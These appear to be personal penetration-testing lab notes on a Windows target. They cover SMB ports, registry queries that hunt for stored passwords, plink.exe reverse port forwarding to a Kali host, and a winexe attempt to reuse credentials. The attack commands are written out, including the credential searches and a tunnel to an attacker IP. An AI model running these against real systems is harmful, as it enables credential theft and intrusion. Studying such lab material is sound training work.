- We find tha**t `139` and `445` are open**
- Meaning `smb` service for sharing files
- Note:- **This port is open only internally, we see it open from external kali machine in nmap scan because this machine is broken now**
- ==If we have some credentials, we can login using `crackmapexec`, etc with **SMB mode**==

# Registry PrivEsc
---
- `reg query HKLM /f password /t REG_SZ /s`
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
![[Pasted image 20250413161756.png]]
![[Pasted image 20250413161817.png]]


# Port Forwarding Using Plink.exe
---
- **SSH backend client for putty**
- https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
- Transfer using `SimpleHTTPServer80`or `python3 -m http server`
- Download using `cerutil`
	- ![[Pasted image 20250413162216.png]]
- **On Kali**
---
- `sudo apt install ssh` => If not installed
- `sudo vi /etc/ssh/sshd_config`
	- Uncomment `PermitRootLogin`and `Yes`
		- ![[Pasted image 20250413162326.png]]
- `service ssh restart`

- **On Windows**
- ---
- `plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.5`
	- `l`: user
	- `pw`: password
	- `R`: remote
- Keep hitting enter
	- ![[Pasted image 20250413162541.png]]


# WinEXE
---
- **Run commands on windows**
- Let's try same password for **Administrator**
- Bad Shell :(
- ![[Pasted image 20250413162741.png]]